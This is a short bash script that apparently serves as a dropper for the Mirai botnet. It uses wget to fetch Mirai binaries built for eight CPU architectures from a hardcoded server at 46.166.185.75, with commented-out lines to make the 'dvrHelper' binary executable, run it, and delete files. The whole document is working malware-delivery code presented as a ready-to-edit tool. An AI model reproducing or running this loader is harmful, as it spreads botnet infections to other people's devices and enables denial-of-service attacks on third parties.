#!/bin/bash

# Edit
WEBSERVER="46.166.185.75:80"
# Stop editing now


BINARIES='mirai.arm mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.x86 mirai.spc'

for Binary in $BINARIES; do
	wget http://$WEBSERVER/$Binary -O $Binary
	#chmod 777 dvrHelper
	#./dvrHelper
done

#rm -f *
